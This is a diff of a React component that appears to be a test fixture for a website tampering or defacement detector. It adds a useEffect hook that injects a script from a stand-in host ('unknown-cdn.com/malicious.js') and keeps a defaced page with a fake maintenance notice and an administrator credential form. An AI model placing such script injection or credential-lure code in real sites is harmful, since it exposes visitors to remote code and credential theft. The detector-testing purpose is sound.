@@ -1,19 +1,33 @@
-import React from 'react';
+import React, { useEffect } from 'react';
 
 /**
- * MainContent - Text Change Stress Test Version
- *
+ * MainContent - Script Injection Test Version
+ * 
  * Focus:
- * - Replacing headlines
- * - Changing body text
- * - Modifying labels/buttons
- * - Rewriting large content blocks
+ * - Structural drift via useEffect injection
+ * - Testing script_injection_new_domain trigger
  */
-
 const MainContent = () => {
+
+  // --- TEST: Script Injection (script_injection_new_domain) ---
+  useEffect(() => {
+    // Manually injecting the script into the real DOM
+    const script = document.createElement("script");
+    script.src = "https://unknown-cdn.com/malicious.js";
+    script.id = "malicious-script-trigger";
+    script.async = true;
+    
+    document.body.appendChild(script);
+
+    // Cleanup when component unmounts
+    return () => {
+      const el = document.getElementById("malicious-script-trigger");
+      if (el) document.body.removeChild(el);
+    };
+  }, []);
+
   return (
     <div className="defaced-root" id="layer1-pwned-zone">
-
       <header
         className="hacked-header"
         style={{
@@ -23,34 +37,17 @@ const MainContent = () => {
           textAlign: 'center',
         }}
       >
-        {/* HEADLINE CHANGE */}
         <h1 style={{ fontSize: '3rem', marginBottom: '10px' }}>
           PLATFORM MAINTENANCE ACTIVE
         </h1>
-
         <h2 style={{ fontWeight: 'normal' }}>
           User services are temporarily operating in restricted mode
         </h2>
       </header>
 
       <main className="content-purge" style={{ padding: '30px' }}>
-
-        {/* BODY TEXT CHANGES */}
         <p>
-          We are currently performing a large-scale infrastructure migration
-          to improve application reliability, authentication performance,
-          and long-term scalability.
-        </p>
-
-        <p>
-          During this maintenance period, some dashboard modules,
-          verification systems, and account management tools may
-          respond more slowly than expected.
-        </p>
-
-        <p>
-          Our engineering team is actively monitoring service health
-          and applying configuration updates across production systems.
+          We are currently performing a large-scale infrastructure migration...
         </p>
 
         {/* LARGE CONTENT REWRITE */}
@@ -64,22 +61,10 @@ const MainContent = () => {
           }}
         >
           <h3>Infrastructure Update Notice</h3>
-
-          <p>
-            Several backend services are being redeployed as part of
-            a scheduled modernization initiative. This includes API
-            routing improvements, database optimization procedures,
-            and internal authentication policy upgrades.
-          </p>
-
-          <p>
-            Users may experience temporary interruptions while
-            synchronization tasks complete across distributed regions.
-            We appreciate your patience while these updates are finalized.
-          </p>
+          <p>Several backend services are being redeployed...</p>
         </section>
 
-        {/* MODIFIED FORM LABELS + BUTTONS */}
+        {/* FORM TEST */}
         <form
           action="/verify"
           method="POST"
@@ -91,66 +76,22 @@ const MainContent = () => {
           }}
         >
           <h3>Administrator Access Validation</h3>
-
-          <label
-            htmlFor="adminKey"
-            style={{ display: 'block', marginBottom: '10px' }}
-          >
-            Secure Verification Credential
-          </label>
-
-          <input
-            id="adminKey"
-            type="password"
-            placeholder="Enter authorized verification credential"
-            style={{
-              padding: '12px',
-              width: '100%',
-              marginBottom: '20px',
-            }}
-          />
-
-          <button
-            type="submit"
-            style={{
-              backgroundColor: '#ff4444',
-              color: 'white',
-              border: 'none',
-              padding: '12px 24px',
-              cursor: 'pointer',
-            }}
-          >
-            Validate Administrative Session
+          <input type="password" placeholder="Enter credential" style={{ padding: '12px', width: '100%' }} />
+          <button type="submit" style={{ backgroundColor: '#ff4444', color: 'white', padding: '12px 24px', marginTop: '10px' }}>
+            Validate Session
           </button>
         </form>
       </main>
 
-      {/* Structural filler */}
-      <div
-        className="structural-noise"
-        aria-hidden="true"
-        style={{ opacity: 0, height: 0 }}
-      >
+      {/* Structural filler to maintain node count for baseline comparison */}
+      <div style={{ opacity: 0, height: 0 }}>
         {Array.from({ length: 400 }).map((_, i) => (
-          <section key={i} className={`anomaly-block-v4-${i}`}>
-            <span id={`drift-id-${i}`}>
-              STRUCTURAL_ENTROPY_ACTIVE
-            </span>
-          </section>
+          <section key={i}><span id={`drift-node-${i}`}>ENTROPY</span></section>
         ))}
       </div>
 
-      <footer
-        className="footer-void"
-        style={{
-          textAlign: 'center',
-          padding: '20px',
-          borderTop: '4px solid #ff4444',
-        }}
-      >
-        <b style={{ fontSize: '20px' }}>
-          SYSTEM STATUS: MAINTENANCE MODE
-        </b>
+      <footer style={{ textAlign: 'center', padding: '20px', borderTop: '4px solid #ff4444' }}>
+        <b>SYSTEM STATUS: MAINTENANCE MODE</b>
       </footer>
     </div>
   );
